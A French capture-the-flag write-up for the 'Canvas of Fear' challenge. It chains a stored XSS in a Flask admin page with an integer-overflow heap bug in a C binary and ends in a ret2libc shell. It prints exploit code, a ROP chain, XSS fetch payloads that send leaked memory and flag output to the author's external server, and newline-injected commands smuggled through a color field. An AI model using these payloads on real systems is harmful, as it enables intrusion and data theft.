# Canvas of Fear

**Category**: PWN  
**Points**: 100
**Solves**: 106
**Author**: HeaZzy

**Challenge Description**:
A dark and creepy web application where users can commission custom artworks from a mysterious artist. But beware... if your fear is too strong your fear might just take the control!

**Artifact Files**:
[Canvas_of_fear.zip](./Canvas_of_fear.zip)

## Challenge overfiew

Ce challenge est un peu particulier pour du pwn ! Lorsque j'ai démarré l'instance pour tester le challenge avant de commencer à tripatouiller dans le code source,
j'ai pu découvrir que ce challenge ne nous donnait pas une IP et un PORT netcat comme la plupart des challenges de pwn mais bien un site web : 

![front page](./images/front_page.png)

Jusqu'ici, l'envoie de message dans le formulaire ne semble pas nous amener ailleurs ou nous donner plus d'informations...
Regardons donc les sources qui nous ont été données :\)

## Sources

En effet, dans les sources on découvre qu'il y a bien plus à ce challenge. On a : 
- server.py : Un serveur Flask qui a de nombreuses fonctionnalités "administrateur" réservés aux connections depuis 127.0.0.1
- canvas_manager : Un binaire qui va sans doute être notre cîble de pwnage principale pour ce challenge
- libc.so.6 et ld-linux-x86-64.so.2 : Les shared objects libc et ld utilisées par le binaire sur la remote

En regardant de plus prêt dans le code source du server web, on peut voir que les fonctionnalités admin intéragissent directement avec le binaire `canvas_manager`. Nous allons donc devoir les exploiter à travers cette application web ! Plutôt sympa comme idée :\). Reste à trouver comment réussir à activer ces endpoints étant donné que sur la remote notre ip ne sera jamais 127.0.0.1 ! 

On peut aussi trouver le panel admin qui permet de directement déssiner à travers l'API et donc intérragir avec le binaire ! Plutôt cool : 
![panel admin](./images/admin_panel.png)

Les habitués de la cyber se doutent que pour ce genre de cas il n'y a rien de mieux qu'une bonne **XSS** qui nous permettrai d'exécuter du javascript dans le navigateur d'un utilisateur qui valide la condition `IP_CLIENT = 127.0.0.1` aux yeux du server et donc de passer outre les filtres du code.

## Searching for XSS

Pour la XSS pas besoin de chercher bien loin puisqu'on peut trouver que les messages envoyés plus tôt par le formulaire auquel nous avons accès sont affichés dans un endpoint `/admin/messages`:

```py
@app.route('/admin/messages')
def admin_messages():
    if request.remote_addr not in ['127.0.0.1', '::1']:
        return "Access denied. Admin access required.", 403
    with messages_lock:
        messages = list(global_messages)
    resp = make_response(render_template('admin_messages.html', messages=messages))
    delete_messages()
    return resp
```

Par défaut, flask bloque les tentatives d'injections dans ses templates sauf si on lui dit explicitement de ne pas le faire avec le keyword `safe`. On peut voir que c'est exactement ce qui se produit dans le template `admin_messages.html`:

```html
<div class="messages">
    {% if messages %}
        {% for msg in messages %}
        <div class="message">
            <div class="message-header">
                <div class="message-avatar">{{ ((msg.author or 'Anonymous')|safe)[0]|upper }}</div>
                <div class="author">{{ (msg.author or 'Anonymous') | safe }}</div>
            </div>
            <div class="content">{{ (msg.content or '') | safe }}</div>
        </div>
        {% endfor %}
    {% else %}
        <div class="empty">
            <div>No messages yet.</div>
            <div style="margin-top: 10px; font-size: 14px;">The void is silent...</div>
        </div>
    {% endif %}
</div>
```

On peut vérifier en local en démarrant le server flask et en vérifiant le panel `/admin/messages` après avoir envoyé un payload XSS standard : `<script>alert(1)</script>`:

![PoC XSS](./images/xss_poc.png)

## Analysis of the backend binary

Parfait, on a donc notre vecteur d'exploitation pour intérragir avec l'exécutable du backend `canvas_manager`. On peut voir comment l'api envoie des messages à celui-ci dans le code source de `server.py`:

```py
@app.route('/api/canvas/create', methods=['POST'])
def api_create_canvas():
    # ...
    response = send_command(f"CREATE {canvas_id} {width} {height}")
    # ...

@app.route('/api/canvas/set', methods=['POST'])
def api_set_pixel():
    # ...
    response = send_command(f"SET {data.get('id')} {data.get('x')} {data.get('y')} {color}")
    # ...

@app.route('/api/canvas/get/<int:canvas_id>', methods=['GET'])
def api_get_canvas(canvas_id):
    # ...
    response = send_command(f"GET {canvas_id}")
    # ...

@app.route('/api/canvas/list', methods=['GET'])
def api_list_canvas():
    # ...
    response = send_command("GETALL")
    # ...

@app.route('/api/canvas/delete/<int:canvas_id>', methods=['DELETE'])
def api_delete_canvas(canvas_id):
    # ...
    response = send_command(f"DELETE {canvas_id}")
    # ...

@app.route('/api/canvas/exit', methods=['POST'])
def api_exit_binary():
    # ...
    binary_process.sendline("EXIT".encode())
    # ...
```

L'utilitaire *send_command* ici est intéressant puisqu'il passe directement les données décodés de la requête HTTP au process qui est géré ici par la librairie `pwntools`. Cette procédure est intéressante puisqu'elle implique qu'on peut injecter des commandes avec des '\n' escaped ou urlencodé ce qui nous sera utile plus tard si nous arrivons à ouvrir un shell dans le binaire et injecter des commandes à travers l'API.

On peut voir que le binaire valide bien nos trouvailles : 

![binary commands](./images/binary_commands.png)

A partir d'ici, j'ai utilisé [Ghidra](http://ghidra.net/) pour reverse le binaire et trouver la faille de sécurité qui nous permetterai d'ouvrir un shell à travers celui-ci. 

### Canvas creation

La fonction pour la création de canvas après avoir été reversé par mes soins dans **Ghidra** ressemble à ça :

![Create Canvas](./images/create_canvas.png)

On peut voir que la création d'un canvas prend en argument un nombre identifiant du canvas ainsi qu'un argument **width** (largeur) et **height** (hauteur).
Le programme vérifie ensuite que la hauteur et largeut sont inférieurs à 51 (donc 0 <= width / height <= 50 pour les dimensions). Une fois la vérification effectuée, une allocation de taille 0x18 est effectuée pour la structure de données du canvas qui garde les paramètres suivants : 
- width
- height
- id number
- pointer to data block

On peut aussi voir qu'il y a une limite de 10 canvas dans ce programme et que celui-ci alloue un bloc de mémoire de taille `width*height*3`. En l'occurence, cela permet de stocker les composantes RGB de chacun des pixels du canvas.

### Setting pixels values in a canvas

![canvas modifications of pixels](./images/set_pixels.png)

Cette fonction prend en argument le numéro identifiant du canvas ainsi que la position X et Y du pixel et les composantes RGB stockées dans un int "data".
La partie la plus intéressante pour nous est ici puisqu'on peut voir que la variable *X* est utilisée pour stocker le résultat du calcul `y * height + x` qui correspond a un calcul d'index dans une array à 2 dimensions en mémoire. Ce calcul est problématique puisque *X* est un **int**. Autrement dit un entier signé sur 32 bits. Un calcul avec multiplication + addition sur des valeurs entrées par l'utilisateur et non contrôlées permet d'atteindre facilement les limites de stockage des 32 bits assignés. On a donc un **Integer Overflow** qui nous permet un accès **Out of Bound** dans les donnés d'un canvas. 

Les plus assidus d'entre vous verront qu'il y a pourtant une vérification `x < first->width * first->height` cependant cela a peu d'importance puisqu'on peut faire en sorte que notre **Integer Overflow** créer un nombre négatif et valide la condition nous donnant un accès **Out of Bound** négatif (on peut réecrire la mémoire qui précède le bloc de données des pixels).

Vérifions notre théorie : 

![PoC Integer overflow](./images/int_overflow_poc.png)

Pour les plus curieux vous verrez que faire l'opération ci-dessus dans un programme C avec un type int donnera le résultat "-8" et "-24" pour le binaire qui multiplie par 3 pour l'index des composantes RGB. Notre payload valide donc bien la vérification du programme tout en sortant de la zone de mémoire prévue !

### Getting pixels values out of a canvas

![canvas reading pixels](./images/canvas_get.png)

Cette fonction prend en argument uniquement l'identifiant d'un canvas et dump toutes les valeurs RGB de celui-ci en affichant chacune des lignes au format suivant : 

```
(0x000000, ..., 0xffffff)
.
.
.
(0x000000, ..., 0xffffff)
```

Elle sera très utile pour sortir de l'information de ce programme et obtenir nos leaks à partir de notre primitive d'écriture découverte précedemment !

### Deleting a canvas 

![canvas deletion](./images/delete_canvas.png)

Cette fonction supprime simplement un canvas par son identifiant. Elle est mentionée ici car elle nous sera utile plus tard dans l'exploitation mais n'a pas de faille particulière. On voit d'abord que le chunk contenant les données RGB est libéré à l'allocateur et qu'ensuite la structure de donnée du canvas est libérée elle aussi. La liste des canvas supprime bien l'élément donc pas de **Use after Free** exploitable.

## Exploitation


Nous avons trouvé une faille exploitable dans ce programme ! Maintenant, il faut réussir à convertir cette petite primitive en une **RCE** !
Dans un premier temps, j'ai développé un exploit traditionnel python avant d'utiliser celui-ci pour développer des payloads successifs XSS permettant l'exploitation à travers le site uniquement et sans droits admin !

### Pwning the binary

Voici le procédé d'exploitation que j'ai mis en place pour ce binaire : 
1. On créer 3 canvas avec la commande CREATE
2. On utilise la vulnérabilité pour réecrire le paramètre de taille de notre structure de canvas pour le canvas "1" de manière à dépassé sur la mémoire du suivant.
3. On supprime le canvas 2, se situant juste après le canvas que nous avons visé dans l'étape précédente. Celui-ci doit être assez large en dimension pour que le chunk de données soit mis dans les `unsortedbin` et donc ajouté dans une liste doublement chaîné dont la tête et la queue se trouve dans l'arène principale libc (autrement dit ça nous permet de mettre un pointeur libc sur la heap en runtime et donc de leak cette addresse avec notre overflow).
4. On lit le contenu avec la commande "GET" du canvas "1". Etant donné que nous avons modifié la taille de celui-ci pour le rendre plus grand qu'il ne l'ait réellement, une partie des données qui nous sont affichés comme des valeurs RGB sont en réalité les métadonnées heap du chunk suivant que nous avons libéré !
5. On récupère la sortie et on la parse pour obtenir les addresses de la libc et de la heap en runtime
6. Toujours avec la vulnérabilité dans le canvas "1", on vise cette fois le pointeur de données du canvas "3". Connaissant maintenant les addresses de la libc, je me suis mis en tête d'aller modifier un pointeur de canvas avec l'adresse du symbole **environ** qui garde un pointeur vers les variables d'environnement dans la stack. Ainsi, nous pourrions obtenir un leak de stack et injecter une ROP chain à la sortie de `main()` !
7. On lit le canvas 3 pour sortir les données à l'adresse de **environ** et on reparse comme précedemment pour obtenir le leak de la stack
8. On répète la même attaque en réecrivant cette fois le pointeur du canvas 3 par celui de notre adresse de retour de `main()` dans la stack
9. On écrit notre ROP chain à partir du canvas 3 qui pointe donc vers l'adresse de retour de main
10. On appelle EXIT -> `main()` return -> notre rop chain s'exécute et ouvre un shell

Dans le fichier [exp.py](./challenge_files/exp.py), vous trouverez l'exploit complet qui met en place chacune de ses étapes sur lesquels je vais revenir plus en détail.

Les commandes suivantes permettent d'effectuer les parties 1 à 4 : 
```py
cmd(b'CREATE 1 50 50')
cmd(b'CREATE 2 20 20')
cmd(b'CREATE 3 20 20')
cmd(b'DELETE 2')
cmd(b'SET 1 42 8589934591 0x340000')
cmd(b'GET 1')
```

On note ici que le canvas 3 est important pour notre exploit puisqu'il nous permet d'avoir un pointeur de donnée facile à viser pour notre arbitrary write / read primitive et qu'il joue aussi le rôle de bloqueur de consolidation malloc pour préserver notre grand chunk dans les **unsortedbin** et nous permettre d'obtenir le leak libc dont nous avons tant besoin !

J'ai pu calculé que `(8589934591*50 + 42)*3 = -24` pour un int 32 bits ce qui nous permet d'aller modifier la valeur du field **height** de la structure associée au canvas "1". En injectant **0x34** à la place de **0x32** cela nous permet de légèrement débordé dans les données du canvas "2" sur la heap et d'afficher les pointeurs de heap et libc que nous avons pu placer via la suppression du canvas "2".

On peut voir que le programme nous dump un gros bloc de données qui contient bien ce qui s'apparente à nos métadonnées canvas 2 :

![canvas2 leak](./images/leak_1.png)

Un peu de formattage et de parsing plus tard, on peut calculer les bases et battre l'ASLR sur la libc et la heap : 

![canvas2 leak clean](./images/leak1_clean.png)

Enfin, nous pouvons avancer en enlevant la limite d'écriture avec le même payload précédent mais cette fois la valeur 0xffffff ce qui nous permettra de réecrire après nos données de canvas 1 et d'aller modifier le pointeur de donnée du canvas 3 ! 

Avec les lignes suivantes, on peut supprimer cette limite de taille et modifier le pointeur de donnée du canvas 3 pour pointer vers **environ** dans l'espace mémoire de la libc : 

```py
# Unlimited size write
cmd(b'SET 1 42 8589934591 0xffffff', line=False)

# offset is 0x2250 bytes to overwrite BLOCK 3's content ptr
info("target #1 => environ ptr @ " + hex(libc.sym['environ']))
target = unpack(pack(libc.sym["environ"]), endianness='big')
block1 = (target >> 40) & 0xffffff
block2 = (target >> 16) & 0xffffff

cmd(f'SET 1 2928 0 {hex(block1)}'.encode())
cmd(f'SET 1 2929 0 {hex(block2)}'.encode())
cmd(b'GET 3')
```

On affiche ensuite le contenu du canvas 3 avec `GET 3` pour lire les données à l'adresse de **environ** et leak un pointeur vers la stack. En utilisant la même technique de parsing que pour le leak précédent on obtient ceci : 

![leak stack](./images/leak2.png)

On peut voir ci-dessus que j'ai pu calculé le pointeur vers l'adresse de retour de `main()` à partir du leak de stack obtenu ! Ce qui nous permet de passer à la dernière étape et d'écrire notre ROP chain avec la même technique : 

```py
info("target #2 => main ret @ " + hex(main_ret))
target = unpack(pack(main_ret), endianness='big')
block1 = (target >> 40) & 0xffffff
block2 = (target >> 16) & 0xffffff
cmd(f'SET 1 2928 0 {hex(block1)}'.encode(), line=False)
cmd(f'SET 1 2929 0 {hex(block2)}'.encode())

# now canvas 3's content is located at the main return address on the stack, allowing us to perform a rop chain
# let's make a payload writer loop
pop_rdi = libc.address + 0x2d7a2
ret = libc.address + 0x2c495
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat({
    0: [
        pop_rdi, binsh,
        ret,
        libc.sym["system"]
    ]
})
for i in range(0, len(payload), 3):
    block = unpack(payload[i:i+3][::-1].ljust(8, b'\x00')) & 0xffffff
    idx = i//3
    cmd(f'SET 3 {idx} 0 0x{block:06x}'.encode())

cmd(b'EXIT')
```

En appliquant exactement la même méthode de réecriture à partir du pointeur de donnée du canvas 3 réecris, on arrive à écrire une rop chain après le canary de main et à prendre le contrôle du flux d'exécution du programme ! On peut ensuite faire un simple **ret2libc** avec un call à `system("/bin/sh")` qui ouvre un shell à travers le binaire.

Il suffit ensuite d'envoyer la commande `EXIT` pour quitter main et déclencher notre payload. En pratique voilà le résultat : 

![pwned binary !](./images/binary_pwned.png)

### Building an XSS chain to pwn through the forwarded website 

Maintenant que nous avons un procédé clair défini dans notre exploit pour transformer notre programme innofensif en backend vers un shell, Il va falloir réussir à effectuer notre exploit à partir des commandes envoyées par l'API et donc par le bot admin que nous allons rediriger via notre faille XSS ! (eh oui c'est un sacré casse tête).

Pour commencé, j'ai d'abord écrit un fichier [payload1.js](./challenge_files/real_exploit/payload1.js). Qui contient la première partie de notre exploit sans les leaks. Jusqu'ici il s'âgit de créer plein de petits payloads avec l'[API fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) pour exécuter les commandes correspondantes sur le binaire : 

```js
// Petit exemple
var res = await fetch("/api/canvas/create", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        "id": 1,
        "width": 50,
        "height": 50
    })
});

if(!res.ok) {
    window.location = 'http://nosiume.duckdns.org:5000/?error=payload1_part1'
}
```

Pour récupérer les leaks depuis le binaire la tâche est un peu plus complexe puisqu'il faudra extraire les données en les envoyant sur un webhook ou un VPS dans mon cas pour écouter et récupérer les informations avant d'avancer sur l'étape suivante du payload.

Pour cela j'ai implémenter une petite fonction qui setup un socket python et extrait les données telles qu'elles sont envoyées dans mes payloads JS : 
```py
def get_leak_request():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 5000))
    sock.listen(5)

    client, _ = sock.accept()
    req = b""
    while True:
        req += client.recv(65535)
        if req == b'':
            break

        if b'{' not in req or b'}' not in req:
            continue
        break

    client.close()
    sock.close()
   
    data = req[req.find(b'{'):req.find(b'}')+1]
    try:
        json_data = json.loads(data.decode())
    except Exception as e:
        print(e)
        print(req.decode())
        print(data.decode())
        exit(0)

    if 'pixels' in json_data:
        return b64decode(json_data['pixels'])
    elif 'output' in json_data:
        return json_data['output']
    else:
        return b""
```

Après test, la sortie prend un peu de temps à arriver en raison du délai de vérification du bot mais on a bien un hit de notre payload XSS qui arrive a être parsé et lu comme nos leaks d'adresse du binaire !!!

![Remote leak 1 par listener HTTP](./images/remote_leak1.png)

A partir de maintenant, nous devons adapté nos payload XSS en fonction des leaks de mémoire ce qu'on peut faire assez facilement avec des format strings en python : 

```py
info("target #1 => environ ptr @ " + hex(libc.sym['environ']))
target = unpack(pack(libc.sym["environ"]), endianness='big')
block1 = "#" + hex((target >> 40) & 0xffffff)[2:]
block2 = "#" + hex((target >> 16) & 0xffffff)[2:]

with open("payload2.js", "r") as f:
    payload2 = f"<script type=\"module\">{f.read()}</script>" % (block1, block2)


res = requests.post(f"{TARGET_URL}/api/message", json={
    'content': payload2
})
```

Encore une fois [payload2.js](./challenge_files/real_exploit/payload2.js) ne fait que d'exécuter les mêmes commandes que le payload du binaire mais à travers l'API admin que nous pouvons extraire de la même manière que pour le leak précédent.

![Remote leak 2 par listener HTTP](./images/remote_leak2.png)

Enfin, il reste à générer un dernier payload XSS cette fois-ci presque entièrement généré en runtime par le script d'exploit puisqu'il faudra écrire une rop chain à travers l'API admin... Pour cela j'ai crafter une "template" de payload XSS set que j'ai ensuite utilisé pour formatter chacun de mes block d'écriture : 

```py
template = """var res = await fetch("/api/canvas/set", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        "id": %d,
        "x": %d,
        "y": 0,
        "color": "%s"
    })
});

if(!res.ok) {
    window.location = 'http://nosiume.duckdns.org:5000/?error=payload3_part%d'
}
"""

leak = get_leak_request()
data = bytes.fromhex(leak.decode().replace('0x', '').replace(',', '')[:32])
stack_leak = unpack(data[:8])
main_ret = stack_leak - 0x140

info("stack env @ " + hex(stack_leak))
info("main ret @ " + hex(main_ret))

info("target #2 => main ret @ " + hex(main_ret))
target = unpack(pack(main_ret), endianness='big')
block1 = f"#{(target >> 40) & 0xffffff:6x}"
block2 = f"#{(target >> 16) & 0xffffff:6x}"
#cmd(f'SET 1 2928 0 {hex(block1)}'.encode(), line=False)
#cmd(f'SET 1 2929 0 {hex(block2)}'.encode())

raw_js = template % (1, 2928, block1, 1)
raw_js += template % (1, 2929, block2, 2)

pop_rdi = libc.address + 0x2d7a2
ret = libc.address + 0x2c495
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat({
    0: [
        pop_rdi, binsh,
        ret,
        libc.sym["system"]
    ]
})
for i in range(0, len(payload), 3):
    block = unpack(payload[i:i+3][::-1].ljust(8, b'\x00')) & 0xffffff
    idx = i//3
    raw_js += template % (3, idx, f"#{block:06x}", i+3)
```

Ce payload nous permet de générer toute la séquence d'écriture de ROP chain par blocks de 24 bits (3 octets) RGB comme dans l'exploit direct sur le binaire !
Maintenant il nous suffit de faire en sorte que le programme appelle `EXIT` et notre cîble devrait se transformer en shell :\)

Comme on a pu le voir précédemment, on peut appeler l'endpoint `/api/canvas/exit` pour "terminer" le programme. Le problème étant que l'api ferme de force le programme après avoir envoyer la commande et relance un nouveau process ce qui rendrait notre exploit inutile.

C'est là où la façon d'envoyer les messages mentionnée plus tôt dans ce writeup prend son importance. En effet, si on envoie une requête valide avec un body : 
```json
{
    "id": 9,
    "x": 0,
    "y": 0,
    "color": "#000000\nEXIT\n"
}
```

La nouvelle ligne est injectée par pwntools et permet donc d'exécuter une auter commande après l'exécution de la commande SET qui, ici, échouera puisqu'il n'y a pas de canvas avec l'id "9". Cette technique nous permet donc d'appeler `EXIT` sans perdre pour autant le contrôle sur notre programme qui est maintenant devenu un shell !

On utilisera la même technique pour injecter des commandes systèmes dans notre shell et dans notre cas appeler le binaire `./read_flag` qui nous est gentillement donné sur la remote et permet d'afficher le contenu de flag.txt.

Voici le payload que j'ai pu créer pour afficher le flag dans la sortie du binaire et l'envoyer sur mon VPS !
A noter que l'API ne renvoie qu'une ligne de sortie à la fois du binaire d'où l'utilisation de plusieurs requêtes erronés afin d'extraire le message d'erreur qui contient la sortie de `./read_flag`.

```py
raw_js += """
var res = await fetch("/api/canvas/set", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        "id": 9,
        "x": 0,
        "y": 0,
        "color": "#000000\\nEXIT"
    })
});

var accumulator = "";
for(var i = 0 ; i < 3 ; i++) {
    res = await fetch("/api/canvas/set", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            "id": 9,
            "x": 0,
            "y": 0,
            "color": "#000000\\n./read_flag"
        })
    });
    var data = await res.json();
    accumulator += data['message'];
}


var res = await fetch('http://nosiume.duckdns.org:5000/', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        "output": accumulator
    })
});
"""


payload3 = f"<script type=\"module\">{raw_js}</script>"
res = requests.post(f"{TARGET_URL}/api/message", json={
    'content': payload3
})

if res.status_code != 200:
    print("Something went wrong !")

success(get_leak_request())
```

Et maintenant plus qu'à croiser les doigts et espérer que le bot effectue toutes nos commandes correctement !

![solve](./images/solve.png)

Le flag s'affiche ! Ici, j'ai du le tester avec un faux flag local puisque les remotes ont été fermées après le ctf. On peut voir que mon parser n'a pas réussi à comprendre la requête envoyé par mon payload XSS mais le message d'erreur affiche le flag malgré tout !

Flag officiel : `MCTF{Wh3n_Fe4r_3sc4p3_Th3_C4NV4S}`

L'exploit final est disponible [ici](./challenge_files/real_exploit/final_exp.py) et l'exploit du binaire [ici](./challenge_files/exp.py).

## Reflections

J'ai beaucoup aimé ce challenge qui part d'un challenge de heap assez basique mais un peu tricky quand même (la primite initiale est plutôt légère mais a u gros impact) mais surtout la combinaison d'un payload XSS pour atteindre un binaire vulnérable était assez fun à mettre en place :)

*Malgré ça le challenge s'est bien fait poutrer par IA mais on en parle pas*

Merci beaucoup à HeaZzy et l'équipe du Midnight Flag 2026 pour les challs qualitatifs !

[Back Home](../README.md)
